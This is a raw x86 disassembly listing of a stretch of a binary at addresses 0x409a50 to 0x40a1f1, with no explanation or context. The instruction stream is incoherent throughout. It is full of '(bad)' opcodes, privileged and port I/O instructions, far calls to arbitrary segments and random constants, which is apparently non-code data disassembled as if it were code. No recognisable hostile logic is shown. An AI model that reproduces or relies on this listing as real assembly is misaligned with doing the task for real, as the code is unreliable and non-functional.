  409a50:	lea    edi,[ebp-0x16]
  409a53:	retf   
  409a54:	cs enter 0x3a0e,0xef
  409a59:	push   edi
  409a5a:	dec    edi
  409a5b:	cmp    bh,BYTE PTR [ebx]
  409a5d:	push   ebx
  409a5e:	mov    esp,0x7c505f46
  409a63:	pop    ecx
  409a64:	pop    edi
  409a65:	clc    
  409a66:	mov    eax,ds:0x88a7e88f
  409a6b:	adc    BYTE PTR [edx-0x2a],0x27
  409a6f:	pusha  
  409a70:	inc    ecx
  409a71:	push   ds
  409a72:	xor    ch,BYTE PTR [esi+0x6056c7a6]
  409a78:	or     dh,ch
  409a7a:	sub    dl,dl
  409a7c:	aaa    
  409a7d:	push   esi
  409a7e:	retf   0x66b3
  409a81:	adc    cl,ah
  409a83:	adc    DWORD PTR [esi],ebp
  409a85:	mov    ebx,0xc18da2b6
  409a8a:	inc    DWORD PTR [eax+0x5b]
  409a8d:	cdq    
  409a8e:	push   edi
  409a8f:	dec    ebx
  409a90:	push   edi
  409a91:	jbe    0x409ad2
  409a93:	pop    ss
  409a94:	xchg   ebp,eax
  409a95:	retf   
  409a96:	xor    DWORD PTR [edx-0x50],eax
  409a99:	mov    bh,0x14
  409a9b:	xchg   esp,eax
  409a9c:	jae    0x409a46
  409a9e:	test   BYTE PTR [edi],dh
  409aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aa1:	jecxz  0x409ae6
  409aa3:	push   ebx
  409aa4:	mov    gs,WORD PTR [ebx-0x10]
  409aa7:	loopne 0x409b22
  409aa9:	ss das 
  409aab:	test   al,0x63
  409aad:	mov    edx,0xb8ac98ec
  409ab2:	sbb    BYTE PTR [edx+eiz*1],ch
  409ab5:	pushf  
  409ab6:	jno    0x409aaa
  409ab8:	sbb    BYTE PTR [edx+ebx*8],0xbd
  409abc:	mov    ebp,0x9a366689
  409ac1:	in     eax,dx
  409ac2:	and    bl,BYTE PTR [esi-0x2f]
  409ac5:	loope  0x409a92
  409ac7:	add    dl,BYTE PTR [edi+edx*8+0x13]
  409acb:	mov    cl,0xa6
  409acd:	fst    QWORD PTR [ebx+0x3d]
  409ad0:	scas   eax,DWORD PTR es:[edi]
  409ad1:	pop    ecx
  409ad2:	out    dx,eax
  409ad3:	xchg   edi,eax
  409ad4:	pop    ds
  409ad5:	sub    ebp,ecx
  409ad7:	and    ebx,edi
  409ad9:	imul   ebp,ebp,0xffffffa8
  409adc:	mov    esp,0x78b2cbf4
  409ae1:	and    edi,ecx
  409ae3:	pop    esp
  409ae4:	call   0x333c65f8
  409ae9:	push   cs
  409aea:	sar    DWORD PTR [edx+0x686e27bd],0x74
  409af1:	sbb    al,0xce
  409af3:	in     al,0xd3
  409af5:	shr    BYTE PTR [esi+0x5943e2b8],cl
  409afb:	dec    eax
  409afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409afd:	frstor [eax]
  409aff:	retf   
  409b00:	(bad)  
  409b01:	inc    DWORD PTR [edx]
  409b03:	ror    BYTE PTR [ebx+esi*1+0x41],1
  409b07:	xor    esp,DWORD PTR [ecx-0x10]
  409b0a:	jbe    0x409b11
  409b0c:	ficomp WORD PTR [ecx+0x7d]
  409b0f:	push   ecx
  409b10:	int    0x70
  409b12:	inc    eax
  409b13:	add    eax,0xec1ecd54
  409b18:	and    dh,BYTE PTR [ecx-0x53]
  409b1b:	(bad)  
  409b1c:	sub    edx,esp
  409b1e:	das    
  409b1f:	iret   
  409b20:	mov    bh,0xa9
  409b22:	scas   al,BYTE PTR es:[edi]
  409b23:	and    dl,dh
  409b25:	push   ds
  409b26:	push   es
  409b27:	sahf   
  409b28:	cs jge 0x409b65
  409b2b:	(bad)  
  409b2c:	dec    esp
  409b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b2e:	fbstp  TBYTE PTR [ebx-0x65]
  409b31:	xchg   esp,eax
  409b32:	lods   eax,DWORD PTR ds:[esi]
  409b33:	aaa    
  409b34:	popa   
  409b35:	xchg   BYTE PTR [edi],ch
  409b37:	mov    bh,0x85
  409b39:	push   ss
  409b3a:	in     al,dx
  409b3b:	xor    al,0x5a
  409b3d:	adc    DWORD PTR [ebx+0x5c],esp
  409b40:	push   0x828f3b8
  409b45:	fidiv  DWORD PTR [ebp+ecx*8-0x6d]
  409b49:	push   esi
  409b4a:	stos   BYTE PTR es:[edi],al
  409b4b:	popf   
  409b4c:	jns    0x409ba2
  409b4e:	add    eax,0xe5b7b01
  409b53:	sub    esp,DWORD PTR [ebx-0x3d28bc07]
  409b59:	and    eax,0xcbfb903b
  409b5e:	test   BYTE PTR [esi+0x3f2f53f9],dh
  409b64:	call   FWORD PTR [ebx+esi*1+0x5a]
  409b68:	xchg   esp,eax
  409b69:	les    ecx,FWORD PTR [edx+0x7b]
  409b6c:	cmp    ch,bh
  409b6e:	fwait
  409b6f:	jp     0x409bd2
  409b71:	shl    BYTE PTR [ebx],cl
  409b73:	jp     0x409aff
  409b75:	mov    ebx,0x933d9282
  409b7a:	stc    
  409b7b:	jge    0x409b77
  409b7d:	mov    ds:0xa5ca4c97,al
  409b82:	lahf   
  409b83:	sub    al,0xe1
  409b85:	jnp    0x409b0b
  409b87:	xor    ebp,DWORD PTR [ebx-0x7f]
  409b8a:	ror    esi,cl
  409b8c:	dec    eax
  409b8d:	inc    eax
  409b8e:	in     al,dx
  409b8f:	jg     0x409b78
  409b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b92:	popa   
  409b93:	pusha  
  409b94:	(bad)  
  409b96:	xchg   ecx,eax
  409b97:	das    
  409b98:	push   ebp
  409b99:	mov    esp,0x3a47f139
  409b9e:	jns    0x409b70
  409ba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ba1:	jmp    0x9c84:0x7b91ff17
  409ba8:	retf   
  409ba9:	sub    eax,0x112735b0
  409bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409baf:	je     0x409b3f
  409bb1:	pop    esi
  409bb2:	imul   BYTE PTR [edx]
  409bb4:	in     eax,0x8f
  409bb6:	rcl    DWORD PTR [eax],0xf1
  409bb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bba:	and    dh,bl
  409bbc:	mov    ?,WORD PTR [ecx+ecx*4]
  409bbf:	ja     0x409bbe
  409bc1:	std    
  409bc2:	sbb    dl,BYTE PTR [eax+0x1c]
  409bc5:	test   DWORD PTR [ebp-0x40e3b2a1],0xd90f66f0
  409bcf:	push   es
  409bd0:	ins    BYTE PTR es:[edi],dx
  409bd1:	push   0x18
  409bd3:	shl    edi,0x4e
  409bd6:	mov    ds:0x9b8d833,al
  409bdb:	pop    ds
  409bdc:	shl    BYTE PTR [ecx-0x662b5daf],cl
  409be2:	ja     0x409bbb
  409be4:	mov    ebp,0x4e0fa3b1
  409be9:	mov    bh,0x5c
  409beb:	repz pop ebx
  409bed:	xchg   esi,eax
  409bee:	mov    ecx,ebp
  409bf0:	xchg   esp,eax
  409bf1:	scas   al,BYTE PTR es:[edi]
  409bf2:	xchg   ecx,eax
  409bf3:	jp     0x409c03
  409bf5:	add    DWORD PTR [edi+0x2be5f637],ecx
  409bfb:	or     eax,0x888af0
  409c00:	or     DWORD PTR [ebp+0x65604a54],ecx
  409c06:	loopne 0x409b94
  409c08:	or     DWORD PTR [ecx],edx
  409c0a:	jmp    0x409be9
  409c0c:	dec    ebx
  409c0d:	cmp    dh,ch
  409c0f:	or     eax,eax
  409c11:	mov    ebx,0xa3c97300
  409c16:	fidiv  DWORD PTR [ebp+ecx*2-0x55]
  409c1a:	jge    0x409c49
  409c1c:	retf   0x32da
  409c1f:	mov    ch,0x3a
  409c21:	jno    0x409bc8
  409c23:	loop   0x409c8c
  409c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c26:	dec    ebx
  409c27:	fadd   QWORD PTR [ebx+0x752ba69a]
  409c2d:	fwait
  409c2e:	in     al,dx
  409c2f:	dec    eax
  409c30:	xchg   edi,eax
  409c31:	push   ss
  409c32:	pop    edx
  409c33:	bound  eax,QWORD PTR [ebx+0x6a]
  409c36:	pop    edx
  409c37:	dec    esp
  409c38:	cmc    
  409c39:	dec    esi
  409c3a:	in     al,0x98
  409c3c:	push   ecx
  409c3d:	xchg   esp,eax
  409c3e:	aaa    
  409c3f:	loope  0x409c83
  409c41:	cmc    
  409c42:	inc    edx
  409c43:	cdq    
  409c44:	push   cs
  409c45:	scas   al,BYTE PTR es:[edi]
  409c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c47:	jo     0x409c14
  409c49:	jne    0x409bf3
  409c4b:	cmp    DWORD PTR [ebp+0x10f29c1c],ebx
  409c51:	mov    al,ds:0x58716550
  409c56:	cmp    BYTE PTR [esi-0x67f38dde],al
  409c5c:	fimul  DWORD PTR [esi+0x53]
  409c5f:	jecxz  0x409bfd
  409c61:	mov    BYTE PTR [edi],ah
  409c63:	and    eax,0x9dae9918
  409c68:	mov    ecx,0x34433b93
  409c6d:	mov    ch,BYTE PTR [ebp-0x69]
  409c70:	push   edi
  409c71:	jo     0x409c9f
  409c73:	fwait
  409c74:	push   esi
  409c75:	in     al,0x3
  409c77:	imul   ebp,eax,0x3015d83b
  409c7d:	sbb    DWORD PTR [ecx+0x3],edx
  409c80:	xor    ah,BYTE PTR [esi]
  409c82:	sub    edx,edx
  409c84:	xchg   ecx,eax
  409c85:	mov    al,BYTE PTR [edi+0x4f]
  409c88:	sub    al,0x77
  409c8a:	sti    
  409c8b:	fnop   
  409c8d:	dec    eax
  409c8e:	jnp    0x409cf4
  409c90:	push   0x967a2295
  409c95:	jecxz  0x409cc7
  409c97:	pop    ds
  409c98:	jo     0x409c30
  409c9a:	sbb    esp,ecx
  409c9c:	je     0x409cb2
  409c9e:	call   0xb9dc:0x4c23d5ba
  409ca5:	dec    edi
  409ca6:	adc    bl,bh
  409ca8:	out    0x52,eax
  409caa:	pushf  
  409cab:	call   0xb5ad:0x29893dc3
  409cb2:	jb     0x409d03
  409cb4:	inc    edx
  409cb5:	arpl   WORD PTR [eax-0x24],sp
  409cb8:	add    dl,BYTE PTR [ebx+0x278f321f]
  409cbe:	jb     0x409d1b
  409cc0:	sbb    ecx,DWORD PTR [esi+eax*1]
  409cc3:	sbb    DWORD PTR [ebx+0x53785d1],0xaa551cd0
  409ccd:	dec    ebp
  409cce:	popf   
  409ccf:	pop    eax
  409cd0:	or     dh,BYTE PTR [ebp-0x1e9873e8]
  409cd6:	dec    edi
  409cd7:	mov    esp,0x2e5ec8c6
  409cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cdd:	(bad)  
  409cdf:	je     0x409d3c
  409ce1:	lods   al,BYTE PTR ds:[esi]
  409ce2:	jns    0x409d03
  409ce4:	in     al,0xba
  409ce6:	dec    edx
  409ce7:	fsubr  QWORD PTR ds:0x941e2bba
  409ced:	ins    DWORD PTR es:[edi],dx
  409cee:	cmp    eax,0xf780a5ba
  409cf3:	rol    BYTE PTR [ecx-0x62c45aa1],0xbb
  409cfa:	and    al,0xed
  409cfc:	cmp    dh,ah
  409cfe:	and    dh,BYTE PTR [ebx]
  409d00:	mov    edx,0xb809021e
  409d05:	ins    BYTE PTR es:[edi],dx
  409d06:	pop    esp
  409d07:	outs   dx,DWORD PTR ds:[esi]
  409d08:	(bad)  
  409d09:	adc    eax,0x993af0ab
  409d0e:	or     ah,BYTE PTR [edx-0x69]
  409d11:	data16 aas 
  409d13:	aaa    
  409d14:	xchg   ebx,eax
  409d15:	xor    DWORD PTR [edx+esi*1-0xf],eax
  409d19:	push   ss
  409d1a:	and    eax,0x94fc83be
  409d1f:	add    esp,esi
  409d21:	mov    ebp,0x26bd1676
  409d26:	icebp  
  409d27:	ficom  DWORD PTR [ebx+0x4d]
  409d2a:	or     DWORD PTR [ecx-0x1507730b],eax
  409d30:	je     0x409d13
  409d32:	into   
  409d33:	shl    DWORD PTR [ebp+0x3cb061d7],1
  409d39:	ficomp WORD PTR [edx*2+0x51f7aecc]
  409d40:	retf   
  409d41:	std    
  409d42:	arpl   WORD PTR [ebx+0x3],si
  409d45:	push   es
  409d46:	xbegin 0xd6aa47ca
  409d4c:	mov    al,ds:0x7f81f9a4
  409d51:	mov    bl,0xc4
  409d53:	fldcw  WORD PTR [edx+0x7d41bbd0]
  409d59:	push   eax
  409d5a:	push   ecx
  409d5b:	jbe    0x409d12
  409d5d:	getsec 
  409d5f:	inc    ebp
  409d60:	iret   
  409d61:	mov    edi,0xb6d60762
  409d66:	sahf   
  409d67:	ins    DWORD PTR es:[edi],dx
  409d68:	push   edi
  409d69:	push   ebx
  409d6a:	int    0x3e
  409d6c:	mov    ds:0xa3a5c001,al
  409d71:	out    dx,eax
  409d72:	test   BYTE PTR [edi],0xa9
  409d75:	lahf   
  409d76:	push   es
  409d77:	fistp  DWORD PTR [esi+0x34]
  409d7a:	fwait
  409d7b:	mov    al,0x93
  409d7d:	nop
  409d7e:	dec    ecx
  409d7f:	and    dl,bl
  409d81:	push   0xa86a842d
  409d86:	pop    ss
  409d87:	icebp  
  409d88:	out    0x48,al
  409d8a:	lahf   
  409d8b:	xor    cl,BYTE PTR [edi-0x5fd2c1cb]
  409d91:	pop    esp
  409d92:	outs   dx,DWORD PTR ds:[esi]
  409d93:	lea    edi,[ebp+0xa]
  409d96:	cli    
  409d97:	add    bl,BYTE PTR [ebp-0x75fa43d3]
  409d9d:	hlt    
  409d9e:	xor    DWORD PTR [ebp-0x7a],eax
  409da1:	aam    0xc7
  409da3:	jle    0x409ddc
  409da5:	mov    bl,0x9c
  409da7:	push   esi
  409da8:	add    bh,0x5b
  409dab:	push   ecx
  409dac:	shl    DWORD PTR [edi+edi*8-0x69],cl
  409db0:	lods   al,BYTE PTR ds:[esi]
  409db1:	jne    0x409d57
  409db3:	fisub  DWORD PTR [ebx+0x245a8d14]
  409db9:	rcr    DWORD PTR [eax-0x32],cl
  409dbc:	out    dx,al
  409dbd:	sbb    eax,0x5c986957
  409dc2:	lea    esp,[ebx-0x47b52a7f]
  409dc8:	popf   
  409dc9:	jns    0x409d50
  409dcb:	and    bh,BYTE PTR [esi-0x5380826a]
  409dd1:	leave  
  409dd2:	aam    0x7e
  409dd4:	sub    cl,cl
  409dd6:	mov    edx,0x2e761dd
  409ddb:	jnp    0x409dde
  409ddd:	lods   eax,DWORD PTR ds:[esi]
  409dde:	adc    edi,DWORD PTR [edx-0x4bf18312]
  409de4:	in     al,dx
  409de5:	add    DWORD PTR [ecx],edi
  409de7:	dec    edx
  409de8:	iret   
  409de9:	inc    BYTE PTR [eax]
  409deb:	fbstp  TBYTE PTR [ecx-0x78524be5]
  409df1:	and    eax,0xac36c11d
  409df6:	pop    es
  409df7:	pop    eax
  409df8:	sbb    bh,BYTE PTR [eax]
  409dfa:	mov    WORD PTR [eax+ebp*8+0x568f9697],es
  409e01:	pop    ebp
  409e02:	mov    edi,0x321597ed
  409e07:	shr    BYTE PTR [ecx+0x21340363],1
  409e0d:	mov    bl,0x8d
  409e0f:	ins    BYTE PTR es:[edi],dx
  409e10:	xor    BYTE PTR [ebx-0x410f2394],0x1
  409e17:	loope  0x409e56
  409e19:	or     ebp,DWORD PTR [ebx-0x24]
  409e1c:	sahf   
  409e1d:	fnstsw WORD PTR [ebp+0x1b]
  409e20:	pusha  
  409e21:	loop   0x409e79
  409e23:	(bad)  
  409e24:	sbb    DWORD PTR [edx],edi
  409e26:	xor    al,BYTE PTR [edx]
  409e28:	in     al,dx
  409e29:	push   0xffffffb9
  409e2b:	nop
  409e2c:	adc    BYTE PTR [esi+eax*1],bl
  409e2f:	and    ebp,ebx
  409e31:	xchg   ebx,eax
  409e32:	mov    ah,0x6b
  409e34:	fs dec eax
  409e36:	jns    0x409dfb
  409e38:	fidivr DWORD PTR gs:[edx+0x14]
  409e3c:	cmove  ebp,esp
  409e3f:	xor    al,0x76
  409e41:	daa    
  409e42:	cmp    DWORD PTR [ebx+0x5b],edi
  409e45:	dec    ecx
  409e46:	mov    dh,0x40
  409e48:	(bad)  
  409e49:	or     edx,edx
  409e4b:	xor    al,0xc3
  409e4d:	out    dx,eax
  409e4e:	ud0    eax,esp
  409e51:	mov    bl,0xe6
  409e53:	test   eax,0x4d5309ab
  409e58:	adc    dh,cl
  409e5a:	clc    
  409e5b:	das    
  409e5c:	daa    
  409e5d:	scas   eax,DWORD PTR es:[edi]
  409e5e:	cmp    bl,BYTE PTR [ecx+0x23]
  409e61:	mov    ds:0x5c76cc2f,al
  409e66:	or     al,0x9e
  409e68:	ja     0x409e2d
  409e6a:	out    dx,al
  409e6b:	sub    ebp,DWORD PTR [ebx]
  409e6d:	jns    0x409eac
  409e6f:	inc    ebx
  409e70:	add    BYTE PTR [eax+0x78fda34d],ch
  409e76:	shl    BYTE PTR [ebp-0x732d0766],1
  409e7c:	pop    esp
  409e7d:	sbb    eax,0x48c0b086
  409e82:	add    BYTE PTR [ebp-0x3a5599ad],al
  409e88:	jb     0x409e5a
  409e8a:	hlt    
  409e8b:	add    esp,0x627add5b
  409e91:	add    DWORD PTR [ebx],0x6c
  409e94:	in     al,dx
  409e95:	retf   0xc7c5
  409e98:	push   esp
  409e99:	enter  0x70cf,0xc
  409e9d:	outs   dx,DWORD PTR ds:[esi]
  409e9e:	in     eax,dx
  409e9f:	jl     0x409ea0
  409ea1:	or     BYTE PTR [esi+edi*8+0x45],bh
  409ea5:	push   esi
  409ea6:	xchg   esp,eax
  409ea7:	jmp    0x8cae:0x870d8ff2
  409eae:	or     edx,edx
  409eb0:	and    edi,DWORD PTR [eax+ebp*2+0x43021717]
  409eb7:	mov    ds:0xd29323e1,al
  409ebc:	mov    ebp,0xe2a0197d
  409ec1:	jmp    0x48f4f2d9
  409ec6:	sbb    dh,BYTE PTR [esi+0x412eecce]
  409ecc:	inc    esp
  409ecd:	cs pop ds
  409ecf:	mov    ds:0xe5e2144,al
  409ed4:	adc    esi,DWORD PTR [ebx-0x522f2cc1]
  409eda:	add    BYTE PTR [ebx+edx*4+0x2e26b6c1],al
  409ee1:	call   0x8200:0xdf4cc4e0
  409ee8:	and    BYTE PTR [esi-0x305e9d5e],al
  409eee:	mov    ebx,0x4ea16812
  409ef3:	inc    esp
  409ef4:	mov    DWORD PTR [edi],esp
  409ef6:	dec    esi
  409ef7:	dec    esi
  409ef8:	sub    esi,DWORD PTR [ecx+eiz*1]
  409efb:	fdiv   QWORD PTR [eax-0x289d6561]
  409f01:	sbb    BYTE PTR [esi-0x5e],ah
  409f04:	or     eax,0xb785c808
  409f09:	mov    dl,0xbb
  409f0b:	sar    BYTE PTR [ecx],1
  409f0d:	and    DWORD PTR es:[ebp+0x125bf8e3],ecx
  409f14:	add    al,0x33
  409f16:	rcl    BYTE PTR [ebx-0x4b],cl
  409f19:	aas    
  409f1a:	shl    DWORD PTR [esi-0x55],cl
  409f1d:	dec    ebx
  409f1e:	or     DWORD PTR [eax-0x35],edx
  409f21:	pop    edi
  409f22:	mov    ebp,0xc6c57b2a
  409f27:	inc    esi
  409f28:	pop    ds
  409f29:	call   0x7775bfba
  409f2e:	sbb    cl,BYTE PTR [edx]
  409f30:	nop
  409f31:	mov    esi,0x7f01622f
  409f36:	mov    ebx,0x5c41ca15
  409f3b:	sbb    BYTE PTR [ebx+0x41],bl
  409f3e:	imul   edx,DWORD PTR [ebp+0x33a3b30b],0x3cb83338
  409f48:	sub    DWORD PTR [ebx-0x56],0x7853b2
  409f4f:	and    BYTE PTR [edi-0x59dfa399],bh
  409f55:	xor    esp,DWORD PTR [ebp+0x7d]
  409f58:	or     cl,al
  409f5a:	je     0x409f12
  409f5c:	sub    ch,BYTE PTR [edi+ecx*1-0x27]
  409f60:	arpl   WORD PTR [esi+0x1b0edd24],ax
  409f66:	stos   DWORD PTR es:[edi],eax
  409f67:	pop    esi
  409f68:	js     0x409fb5
  409f6a:	jmp    0x743d:0x656bcb78
  409f71:	inc    edx
  409f72:	call   0xcaee:0x53519180
  409f79:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  409f7b:	cs in  al,0xb7
  409f7e:	sub    eax,0xb52ff9c7
  409f83:	ret    
  409f84:	scas   eax,DWORD PTR es:[edi]
  409f85:	sbb    dh,BYTE PTR [esi-0x7f23742a]
  409f8b:	dec    ebx
  409f8c:	(bad)  
  409f8d:	(bad)  
  409f8e:	fiadd  DWORD PTR [ecx+0x6cf7ea4]
  409f94:	jnp    0x409fcc
  409f96:	rcl    ch,0x30
  409f99:	jl     0x409fc9
  409f9b:	ret    0x798e
  409f9e:	in     al,0x9c
  409fa0:	jmp    0x40a011
  409fa2:	mov    esi,0xf74ca850
  409fa7:	inc    ebp
  409fa8:	stc    
  409fa9:	iret   
  409faa:	add    edx,DWORD PTR [edx+0x54a7179b]
  409fb0:	outs   dx,DWORD PTR ds:[esi]
  409fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fb2:	repnz repz or BYTE PTR [ecx+0x3c888fa7],dh
  409fba:	imul   eax,DWORD PTR [edi],0xffffffea
  409fbd:	lods   al,BYTE PTR ds:[esi]
  409fbe:	(bad)  
  409fbf:	mov    ecx,DWORD PTR [esi*4-0x968c46b]
  409fc6:	push   0x16
  409fc8:	push   0x5c86f090
  409fcd:	inc    ebx
  409fce:	xor    eax,0x447c149f
  409fd3:	mov    al,ds:0x6499b1e9
  409fd8:	mov    cl,0xe1
  409fda:	sub    ebx,eax
  409fdc:	mov    bh,0x81
  409fde:	je     0x409fac
  409fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fe1:	pop    es
  409fe2:	std    
  409fe3:	sub    al,0x46
  409fe5:	rcl    BYTE PTR [ebp+0x4c],cl
  409fe8:	mov    eax,ds:0xe1a41482
  409fed:	es inc ebx
  409fef:	mov    WORD PTR [edi-0x3dc115d5],fs
  409ff5:	mov    al,ds:0x82b9af39
  409ffa:	stos   DWORD PTR es:[edi],eax
  409ffb:	mov    eax,ds:0x84e7352d
  40a000:	and    ebx,DWORD PTR [ebx-0x12]
  40a003:	adc    eax,0x1f54ea17
  40a008:	push   eax
  40a009:	les    edx,FWORD PTR [eax-0x50]
  40a00c:	inc    esp
  40a00d:	ss dec edi
  40a00f:	clc    
  40a010:	mov    DWORD PTR [edi+0x60],esi
  40a013:	mov    ds:0xa6d2e15c,al
  40a018:	or     BYTE PTR [edi],dl
  40a01a:	ins    BYTE PTR es:[edi],dx
  40a01b:	sub    eax,0xe93e527e
  40a020:	sub    edx,ecx
  40a022:	les    ecx,FWORD PTR [eax]
  40a024:	xchg   esp,eax
  40a025:	out    0xba,eax
  40a027:	cmp    DWORD PTR ds:0xcad6b3d3,0x5d82e5a4
  40a031:	xlat   BYTE PTR ds:[ebx]
  40a032:	cwde   
  40a033:	rol    BYTE PTR ds:0xc454f7c1,0x1
  40a03a:	pop    esi
  40a03b:	retf   
  40a03c:	(bad)  [ecx+0x2f0fffc]
  40a042:	mov    dl,BYTE PTR [eax]
  40a044:	xor    dh,BYTE PTR ds:0xc43a4d19
  40a04a:	ds inc ebp
  40a04c:	mov    edx,0x9aaef2d0
  40a051:	dec    esp
  40a052:	stos   DWORD PTR es:[edi],eax
  40a053:	inc    DWORD PTR [eax-0x2c4086a0]
  40a059:	dec    ecx
  40a05a:	shl    BYTE PTR [edx],0xb8
  40a05d:	sub    DWORD PTR [esi+0x71],esp
  40a060:	cdq    
  40a061:	nop
  40a062:	ins    BYTE PTR es:[edi],dx
  40a063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a064:	mov    esi,0x400169ba
  40a069:	cmp    eax,0xe087f596
  40a06e:	retf   
  40a06f:	fwait
  40a070:	out    0xd1,al
  40a072:	pop    ds
  40a073:	mov    ah,0x4e
  40a075:	imul   esp,DWORD PTR [ecx-0x7facd595],0x8c1faf11
  40a07f:	xchg   ebp,eax
  40a080:	ret    
  40a081:	sub    bh,BYTE PTR [edx]
  40a083:	test   eax,0xcbec2132
  40a088:	lds    edi,FWORD PTR [ebp+0x16]
  40a08b:	test   DWORD PTR [ebp-0x5bc56b6e],ebp
  40a091:	mov    eax,ds:0x77b38bcf
  40a096:	outs   dx,DWORD PTR ds:[esi]
  40a097:	push   0x34
  40a099:	inc    eax
  40a09a:	lock jae 0x40a074
  40a09d:	repz aad 0x50
  40a0a0:	and    al,0x24
  40a0a2:	cmp    DWORD PTR [edi-0x3cc8fd4e],0x4a
  40a0a9:	fidivr DWORD PTR [edi+0x23]
  40a0ac:	mov    dh,0xba
  40a0ae:	scas   eax,DWORD PTR es:[edi]
  40a0af:	pushf  
  40a0b0:	jle    0x40a092
  40a0b2:	jp     0x40a06b
  40a0b4:	xor    al,0x62
  40a0b6:	or     ax,0x7fbc
  40a0ba:	pop    esp
  40a0bb:	ins    BYTE PTR es:[edi],dx
  40a0bc:	ror    ebx,1
  40a0be:	(bad)  
  40a0bf:	pop    ds
  40a0c0:	push   esp
  40a0c1:	in     al,0x76
  40a0c3:	ret    0x4622
  40a0c6:	lds    ebx,FWORD PTR [edx]
  40a0c8:	test   DWORD PTR [esi],esi
  40a0ca:	inc    ebp
  40a0cb:	fidiv  DWORD PTR [edx+ebp*8-0x46]
  40a0cf:	dec    edi
  40a0d0:	fmul   DWORD PTR [ebx+ecx*2+0x34]
  40a0d4:	or     esi,ebx
  40a0d6:	popw   ss
  40a0d8:	aad    0x0
  40a0da:	or     BYTE PTR [edx-0xe],dh
  40a0dd:	mov    ah,0xa1
  40a0df:	lods   eax,DWORD PTR ds:[esi]
  40a0e0:	fdivp  st(1),st
  40a0e2:	adc    BYTE PTR [eax],ah
  40a0e4:	bound  edx,QWORD PTR [eax+ebx*4+0x40]
  40a0e8:	(bad)  
  40a0e9:	jle    0x40a07b
  40a0eb:	adc    eax,DWORD PTR [edx]
  40a0ed:	mov    esp,0x6fe3ab8e
  40a0f2:	mov    esi,0x5e5fe4f4
  40a0f7:	fcomp  QWORD PTR [esi+0x4ac3f175]
  40a0fd:	xchg   ebx,eax
  40a0fe:	popf   
  40a0ff:	push   edi
  40a100:	sub    edi,DWORD PTR [ebp+0x31f11d47]
  40a106:	call   0x7e09:0x92d9b578
  40a10d:	mov    eax,0x312d582b
  40a112:	sub    al,0x81
  40a114:	jns    0x40a15d
  40a116:	dec    eax
  40a117:	xchg   esi,eax
  40a118:	rcl    DWORD PTR [edx+0x3a],cl
  40a11b:	sub    esi,DWORD PTR [ecx]
  40a11d:	(bad)  
  40a11e:	repz add eax,0xd46144e7
  40a124:	dec    edx
  40a125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a126:	and    ah,bh
  40a128:	jb     0x40a149
  40a12a:	shufps xmm0,XMMWORD PTR [ebx],0x86
  40a12e:	sub    BYTE PTR [ebx-0x71ec3ac7],dh
  40a134:	add    BYTE PTR [edi+ecx*4+0x4e],0x5d
  40a139:	int3   
  40a13a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a13b:	loop   0x40a116
  40a13d:	cs je  0x40a137
  40a140:	and    dl,BYTE PTR [ecx+0x2c53c612]
  40a146:	iret   
  40a147:	dec    eax
  40a148:	mul    DWORD PTR [edi+0x2e]
  40a14b:	mov    ecx,0xc9750bd8
  40a150:	adc    cl,dh
  40a152:	dec    ebx
  40a153:	push   es
  40a154:	mov    dh,0x38
  40a156:	call   0xd04a:0x6fa1726b
  40a15d:	lock mov esp,0xf66f23ce
  40a163:	mov    eax,edi
  40a165:	pop    edi
  40a166:	sar    ebp,0x50
  40a169:	out    dx,eax
  40a16a:	test   eax,0xc1359948
  40a16f:	pop    ebp
  40a170:	push   cs
  40a171:	repnz mov eax,ds:0xa67041e4
  40a177:	ins    DWORD PTR es:[edi],dx
  40a178:	call   0x6c1a:0x2e3fec10
  40a17f:	lds    ebx,FWORD PTR [edx-0xd01d53c]
  40a185:	div    BYTE PTR [eax+esi*1]
  40a188:	cmp    eax,0xdd7a0397
  40a18d:	scas   al,BYTE PTR es:[edi]
  40a18e:	jbe    0x40a124
  40a190:	fst    DWORD PTR [edx]
  40a192:	jl     0x40a1a5
  40a194:	inc    ebx
  40a195:	mov    al,0x25
  40a197:	ret    
  40a198:	fdivr  DWORD PTR [ecx+0x7e]
  40a19b:	xchg   edi,eax
  40a19c:	es pop ebp
  40a19e:	idiv   BYTE PTR [edx-0x3c139740]
  40a1a4:	lahf   
  40a1a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1a6:	les    esp,FWORD PTR [ebx-0x79]
  40a1a9:	xor    BYTE PTR [esi+0x1f],bh
  40a1ac:	xchg   DWORD PTR [edi-0x6edc14cb],ebx
  40a1b2:	jne    0x40a1cd
  40a1b4:	ret    0xd19
  40a1b7:	mov    ds:0x6ba1da22,eax
  40a1bc:	ret    0x4797
  40a1bf:	mov    BYTE PTR [edx+0x58],ah
  40a1c2:	aaa    
  40a1c3:	repnz fs stos DWORD PTR es:[edi],eax
  40a1c6:	and    eax,0xa19dd864
  40a1cb:	and    dh,BYTE PTR [ebp-0x7c]
  40a1ce:	dec    ebx
  40a1cf:	in     eax,0xe9
  40a1d1:	sbb    eax,0xfc904898
  40a1d6:	push   ds
  40a1d7:	adc    eax,DWORD PTR [ebx-0x1aecfa2a]
  40a1dd:	fcom   st(0)
  40a1df:	jmp    0x40a198
  40a1e1:	or     esp,DWORD PTR [ecx]
  40a1e3:	push   0xffffffe6
  40a1e5:	jmp    0x40a18b
  40a1e7:	shl    eax,1
  40a1e9:	jbe    0x40a1e0
  40a1eb:	dec    eax
  40a1ec:	add    al,0x93
  40a1ee:	xchg   BYTE PTR [eax+0x7b],dl
  40a1f1:	dec    esi
